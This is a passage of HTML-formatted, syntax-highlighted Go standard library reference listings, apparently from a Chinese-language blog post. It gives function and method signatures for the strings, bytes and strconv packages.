<span class="title">HasSuffix</span><span class="params">(s, suffix <span class="keyword">string</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Index</span><span class="params">(s, substr <span class="keyword">string</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">IndexAny</span><span class="params">(s, chars <span class="keyword">string</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">IndexByte</span><span class="params">(s <span class="keyword">string</span>, c <span class="keyword">byte</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">IndexFunc</span><span class="params">(s <span class="keyword">string</span>, f <span class="keyword">func</span>(<span class="keyword">rune</span>)</span> <span class="title">bool</span>) <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">IndexRune</span><span class="params">(s <span class="keyword">string</span>, r <span class="keyword">rune</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Join</span><span class="params">(a []<span class="keyword">string</span>, sep <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">LastIndex</span><span class="params">(s, substr <span class="keyword">string</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">LastIndexAny</span><span class="params">(s, chars <span class="keyword">string</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">LastIndexByte</span><span class="params">(s <span class="keyword">string</span>, c <span class="keyword">byte</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">LastIndexFunc</span><span class="params">(s <span class="keyword">string</span>, f <span class="keyword">func</span>(<span class="keyword">rune</span>)</span> <span class="title">bool</span>) <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Map</span><span class="params">(mapping <span class="keyword">func</span>(<span class="keyword">rune</span>)</span> <span class="title">rune</span>, <span class="title">s</span> <span class="title">string</span>) <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Repeat</span><span class="params">(s <span class="keyword">string</span>, count <span class="keyword">int</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Replace</span><span class="params">(s, old, <span class="built_in">new</span> <span class="keyword">string</span>, n <span class="keyword">int</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ReplaceAll</span><span class="params">(s, old, <span class="built_in">new</span> <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Split</span><span class="params">(s, sep <span class="keyword">string</span>)</span> []<span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">SplitAfter</span><span class="params">(s, sep <span class="keyword">string</span>)</span> []<span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">SplitAfterN</span><span class="params">(s, sep <span class="keyword">string</span>, n <span class="keyword">int</span>)</span> []<span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">SplitN</span><span class="params">(s, sep <span class="keyword">string</span>, n <span class="keyword">int</span>)</span> []<span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Title</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToLower</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToLowerSpecial</span><span class="params">(c unicode.SpecialCase, s <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToTitle</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToTitleSpecial</span><span class="params">(c unicode.SpecialCase, s <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToUpper</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToUpperSpecial</span><span class="params">(c unicode.SpecialCase, s <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToValidUTF8</span><span class="params">(s, replacement <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Trim</span><span class="params">(s <span class="keyword">string</span>, cutset <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimFunc</span><span class="params">(s <span class="keyword">string</span>, f <span class="keyword">func</span>(<span class="keyword">rune</span>)</span> <span class="title">bool</span>) <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimLeft</span><span class="params">(s <span class="keyword">string</span>, cutset <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimLeftFunc</span><span class="params">(s <span class="keyword">string</span>, f <span class="keyword">func</span>(<span class="keyword">rune</span>)</span> <span class="title">bool</span>) <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimPrefix</span><span class="params">(s, prefix <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimRight</span><span class="params">(s <span class="keyword">string</span>, cutset <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimRightFunc</span><span class="params">(s <span class="keyword">string</span>, f <span class="keyword">func</span>(<span class="keyword">rune</span>)</span> <span class="title">bool</span>) <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimSpace</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimSuffix</span><span class="params">(s, suffix <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">type</span> <span class="title">Builder</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Builder)</span> <span class="title">Cap</span><span class="params">()</span> <span class="title">int</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Builder)</span> <span class="title">Grow</span><span class="params">(n <span class="keyword">int</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Builder)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Builder)</span> <span class="title">Reset</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Builder)</span> <span class="title">String</span><span class="params">()</span> <span class="title">string</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Builder)</span> <span class="title">Write</span><span class="params">(p []<span class="keyword">byte</span>)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Builder)</span> <span class="title">WriteByte</span><span class="params">(c <span class="keyword">byte</span>)</span> <span class="title">error</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Builder)</span> <span class="title">WriteRune</span><span class="params">(r <span class="keyword">rune</span>)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Builder)</span> <span class="title">WriteString</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span></span><br><span class="line"><span class="function"><span class="title">type</span> <span class="title">Reader</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="title">NewReader</span><span class="params">(s <span class="keyword">string</span>)</span> *<span class="title">Reader</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">Read</span><span class="params">(b []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">ReadAt</span><span class="params">(b []<span class="keyword">byte</span>, off <span class="keyword">int64</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">ReadByte</span><span class="params">()</span> <span class="params">(<span class="keyword">byte</span>, error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">ReadRune</span><span class="params">()</span> <span class="params">(ch <span class="keyword">rune</span>, size <span class="keyword">int</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">Reset</span><span class="params">(s <span class="keyword">string</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">Seek</span><span class="params">(offset <span class="keyword">int64</span>, whence <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">int64</span>, error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">Size</span><span class="params">()</span> <span class="title">int64</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">UnreadByte</span><span class="params">()</span> <span class="title">error</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">UnreadRune</span><span class="params">()</span> <span class="title">error</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">WriteTo</span><span class="params">(w io.Writer)</span> <span class="params">(n <span class="keyword">int64</span>, err error)</span></span></span><br><span class="line"><span class="function"><span class="title">type</span> <span class="title">Replacer</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="title">NewReplacer</span><span class="params">(oldnew ...<span class="keyword">string</span>)</span> *<span class="title">Replacer</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Replacer)</span> <span class="title">Replace</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Replacer)</span> <span class="title">WriteString</span><span class="params">(w io.Writer, s <span class="keyword">string</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></span><br></pre></td></tr></table></figure><h3 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h3><p>操作 byte slice</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Compare</span><span class="params">(a, b []<span class="keyword">byte</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Contains</span><span class="params">(b, subslice []<span class="keyword">byte</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ContainsAny</span><span class="params">(b []<span class="keyword">byte</span>, chars <span class="keyword">string</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ContainsRune</span><span class="params">(b []<span class="keyword">byte</span>, r <span class="keyword">rune</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Count</span><span class="params">(s, sep []<span class="keyword">byte</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Equal</span><span class="params">(a, b []<span class="keyword">byte</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">EqualFold</span><span class="params">(s, t []<span class="keyword">byte</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Fields</span><span class="params">(s []<span class="keyword">byte</span>)</span> [][]<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">FieldsFunc</span><span class="params">(s []<span class="keyword">byte</span>, f <span class="keyword">func</span>(<span class="keyword">rune</span>)</span> <span class="title">bool</span>) [][]<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">HasPrefix</span><span class="params">(s, prefix []<span class="keyword">byte</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">HasSuffix</span><span class="params">(s, suffix []<span class="keyword">byte</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Index</span><span class="params">(s, sep []<span class="keyword">byte</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">IndexAny</span><span class="params">(s []<span class="keyword">byte</span>, chars <span class="keyword">string</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">IndexByte</span><span class="params">(b []<span class="keyword">byte</span>, c <span class="keyword">byte</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">IndexFunc</span><span class="params">(s []<span class="keyword">byte</span>, f <span class="keyword">func</span>(r <span class="keyword">rune</span>)</span> <span class="title">bool</span>) <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">IndexRune</span><span class="params">(s []<span class="keyword">byte</span>, r <span class="keyword">rune</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Join</span><span class="params">(s [][]<span class="keyword">byte</span>, sep []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">LastIndex</span><span class="params">(s, sep []<span class="keyword">byte</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">LastIndexAny</span><span class="params">(s []<span class="keyword">byte</span>, chars <span class="keyword">string</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">LastIndexByte</span><span class="params">(s []<span class="keyword">byte</span>, c <span class="keyword">byte</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">LastIndexFunc</span><span class="params">(s []<span class="keyword">byte</span>, f <span class="keyword">func</span>(r <span class="keyword">rune</span>)</span> <span class="title">bool</span>) <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Map</span><span class="params">(mapping <span class="keyword">func</span>(r <span class="keyword">rune</span>)</span> <span class="title">rune</span>, <span class="title">s</span> []<span class="title">byte</span>) []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Repeat</span><span class="params">(b []<span class="keyword">byte</span>, count <span class="keyword">int</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Replace</span><span class="params">(s, old, <span class="built_in">new</span> []<span class="keyword">byte</span>, n <span class="keyword">int</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ReplaceAll</span><span class="params">(s, old, <span class="built_in">new</span> []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Runes</span><span class="params">(s []<span class="keyword">byte</span>)</span> []<span class="title">rune</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Split</span><span class="params">(s, sep []<span class="keyword">byte</span>)</span> [][]<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">SplitAfter</span><span class="params">(s, sep []<span class="keyword">byte</span>)</span> [][]<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">SplitAfterN</span><span class="params">(s, sep []<span class="keyword">byte</span>, n <span class="keyword">int</span>)</span> [][]<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">SplitN</span><span class="params">(s, sep []<span class="keyword">byte</span>, n <span class="keyword">int</span>)</span> [][]<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Title</span><span class="params">(s []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToLower</span><span class="params">(s []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToLowerSpecial</span><span class="params">(c unicode.SpecialCase, s []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToTitle</span><span class="params">(s []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToTitleSpecial</span><span class="params">(c unicode.SpecialCase, s []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToUpper</span><span class="params">(s []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToUpperSpecial</span><span class="params">(c unicode.SpecialCase, s []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ToValidUTF8</span><span class="params">(s, replacement []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Trim</span><span class="params">(s []<span class="keyword">byte</span>, cutset <span class="keyword">string</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimFunc</span><span class="params">(s []<span class="keyword">byte</span>, f <span class="keyword">func</span>(r <span class="keyword">rune</span>)</span> <span class="title">bool</span>) []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimLeft</span><span class="params">(s []<span class="keyword">byte</span>, cutset <span class="keyword">string</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimLeftFunc</span><span class="params">(s []<span class="keyword">byte</span>, f <span class="keyword">func</span>(r <span class="keyword">rune</span>)</span> <span class="title">bool</span>) []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimPrefix</span><span class="params">(s, prefix []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimRight</span><span class="params">(s []<span class="keyword">byte</span>, cutset <span class="keyword">string</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimRightFunc</span><span class="params">(s []<span class="keyword">byte</span>, f <span class="keyword">func</span>(r <span class="keyword">rune</span>)</span> <span class="title">bool</span>) []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimSpace</span><span class="params">(s []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">TrimSuffix</span><span class="params">(s, suffix []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">type</span> <span class="title">Buffer</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="title">NewBuffer</span><span class="params">(buf []<span class="keyword">byte</span>)</span> *<span class="title">Buffer</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="title">NewBufferString</span><span class="params">(s <span class="keyword">string</span>)</span> *<span class="title">Buffer</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">Bytes</span><span class="params">()</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">Cap</span><span class="params">()</span> <span class="title">int</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">Grow</span><span class="params">(n <span class="keyword">int</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">Next</span><span class="params">(n <span class="keyword">int</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">Read</span><span class="params">(p []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">ReadByte</span><span class="params">()</span> <span class="params">(<span class="keyword">byte</span>, error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">ReadBytes</span><span class="params">(delim <span class="keyword">byte</span>)</span> <span class="params">(line []<span class="keyword">byte</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">ReadFrom</span><span class="params">(r io.Reader)</span> <span class="params">(n <span class="keyword">int64</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">ReadRune</span><span class="params">()</span> <span class="params">(r <span class="keyword">rune</span>, size <span class="keyword">int</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">ReadString</span><span class="params">(delim <span class="keyword">byte</span>)</span> <span class="params">(line <span class="keyword">string</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">Reset</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">String</span><span class="params">()</span> <span class="title">string</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">Truncate</span><span class="params">(n <span class="keyword">int</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">UnreadByte</span><span class="params">()</span> <span class="title">error</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">UnreadRune</span><span class="params">()</span> <span class="title">error</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">Write</span><span class="params">(p []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">WriteByte</span><span class="params">(c <span class="keyword">byte</span>)</span> <span class="title">error</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">WriteRune</span><span class="params">(r <span class="keyword">rune</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">WriteString</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(b *Buffer)</span> <span class="title">WriteTo</span><span class="params">(w io.Writer)</span> <span class="params">(n <span class="keyword">int64</span>, err error)</span></span></span><br><span class="line"><span class="function"><span class="title">type</span> <span class="title">Reader</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="title">NewReader</span><span class="params">(b []<span class="keyword">byte</span>)</span> *<span class="title">Reader</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">Read</span><span class="params">(b []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">ReadAt</span><span class="params">(b []<span class="keyword">byte</span>, off <span class="keyword">int64</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">ReadByte</span><span class="params">()</span> <span class="params">(<span class="keyword">byte</span>, error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">ReadRune</span><span class="params">()</span> <span class="params">(ch <span class="keyword">rune</span>, size <span class="keyword">int</span>, err error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">Reset</span><span class="params">(b []<span class="keyword">byte</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">Seek</span><span class="params">(offset <span class="keyword">int64</span>, whence <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">int64</span>, error)</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">Size</span><span class="params">()</span> <span class="title">int64</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">UnreadByte</span><span class="params">()</span> <span class="title">error</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">UnreadRune</span><span class="params">()</span> <span class="title">error</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Reader)</span> <span class="title">WriteTo</span><span class="params">(w io.Writer)</span> <span class="params">(n <span class="keyword">int64</span>, err error)</span></span></span><br></pre></td></tr></table></figure><h3 id="strconv"><a href="#strconv" class="headerlink" title="strconv"></a>strconv</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AppendBool</span><span class="params">(dst []<span class="keyword">byte</span>, b <span class="keyword">bool</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">AppendFloat</span><span class="params">(dst []<span class="keyword">byte</span>, f <span class="keyword">float64</span>, fmt <span class="keyword">byte</span>, prec, bitSize <span class="keyword">int</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">AppendInt</span><span class="params">(dst []<span class="keyword">byte</span>, i <span class="keyword">int64</span>, base <span class="keyword">int</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">AppendQuote</span><span class="params">(dst []<span class="keyword">byte</span>, s <span class="keyword">string</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">AppendQuoteRune</span><span class="params">(dst []<span class="keyword">byte</span>, r <span class="keyword">rune</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">AppendQuoteRuneToASCII</span><span class="params">(dst []<span class="keyword">byte</span>, r <span class="keyword">rune</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">AppendQuoteRuneToGraphic</span><span class="params">(dst []<span class="keyword">byte</span>, r <span class="keyword">rune</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">AppendQuoteToASCII</span><span class="params">(dst []<span class="keyword">byte</span>, s <span class="keyword">string</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">AppendQuoteToGraphic</span><span class="params">(dst []<span class="keyword">byte</span>, s <span class="keyword">string</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">AppendUint</span><span class="params">(dst []<span class="keyword">byte</span>, i <span class="keyword">uint64</span>, base <span class="keyword">int</span>)</span> []<span class="title">byte</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Atoi</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">CanBackquote</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">FormatBool</span><span class="params">(b <span class="keyword">bool</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">FormatFloat</span><span class="params">(f <span class="keyword">float64</span>, fmt <span class="keyword">byte</span>, prec, bitSize <span class="keyword">int</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">FormatInt</span><span class="params">(i <span class="keyword">int64</span>, base <span class="keyword">int</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">FormatUint</span><span class="params">(i <span class="keyword">uint64</span>, base <span class="keyword">int</span>)</span> <span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">IsGraphic</span><span class="params">(r <span class="keyword">rune</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">IsPrint</span><span class="params">(r <span class="keyword">rune</span>)</span> <span 